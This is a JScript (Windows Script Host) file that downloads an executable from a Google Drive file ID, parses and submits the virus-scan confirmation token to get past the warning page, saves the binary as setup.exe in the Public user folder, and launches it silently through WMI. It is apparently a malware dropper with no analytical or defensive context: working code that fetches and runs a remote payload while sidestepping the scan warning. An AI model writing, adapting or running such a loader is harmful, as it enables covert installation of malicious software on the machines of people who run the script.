var fileId = "1lwYJgdgsADfgTs5tb3OSdQxJxmuKkWik";
var savePath = "C:\\Users\\Public\\setup.exe";

try {
    // Step 1: Get the download link (Google Drive requires a confirmation token)
    var xhr = new ActiveXObject("MSXML2.XMLHTTP");
    xhr.open("GET", "https://drive.google.com/uc?export=download&id=" + fileId, false);
    xhr.send();

    // Check if there's a confirmation page (virus scan warning)
    if (xhr.status === 200) {
        var html = xhr.ResponseText;
        var confirmMatch = html.match(/action="\/uc\?export=download[^"]*confirm=([^"&]+)/);
        
        if (confirmMatch) {
            // Google Drive wants confirmation — get the real download URL
            var confirmToken = confirmMatch[1];
            var realUrl = "https://drive.google.com/uc?export=download&confirm=" + confirmToken + "&id=" + fileId;
            
            // Download the actual binary
            var xhr2 = new ActiveXObject("MSXML2.XMLHTTP");
            xhr2.open("GET", realUrl, false);
            xhr2.send();
            
            if (xhr2.status !== 200) {
                WScript.Echo("Download failed: " + xhr2.status);
                WScript.Quit(1);
            }
            
            // Save to file
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Type = 1;
            stream.Open();
            stream.Write(xhr2.ResponseBody);
            stream.SaveToFile(savePath, 2);
            stream.Close();
        } else {
            // No confirmation needed — direct download worked
            var stream = new ActiveXObject("ADODB.Stream");
            stream.Type = 1;
            stream.Open();
            stream.Write(xhr.ResponseBody);
            stream.SaveToFile(savePath, 2);
            stream.Close();
        }
    } else {
        WScript.Echo("Download failed with status: " + xhr.status);
        WScript.Quit(1);
    }

    // Execute silently via WMI
    var wmi = GetObject("winmgmts:Win32_Process");
    var result = wmi.Create(savePath, null, null, null);

    if (result === 0) {
        WScript.Echo("Success.");
    } else {
        WScript.Echo("Execution failed with code: " + result);
    }
} catch (e) {
    WScript.Echo("Error: " + e.message);
    WScript.Quit(1);
}
